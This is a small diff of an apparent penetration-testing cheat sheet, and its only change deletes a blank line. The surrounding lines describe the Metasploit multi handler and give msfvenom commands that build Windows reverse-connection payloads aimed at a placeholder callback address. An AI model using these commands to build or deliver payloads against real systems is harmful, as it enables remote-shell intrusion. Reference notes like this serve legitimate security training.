@@ -26,7 +26,6 @@
   * -q runs it in quiet mode for less text
   * Set up the multi handler to match payloads created with msfvenom to catch staged or unstaged payloads
   
-
 # [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/):
 #### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows`
 #### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows -b "\x00\x0a\x0d"`
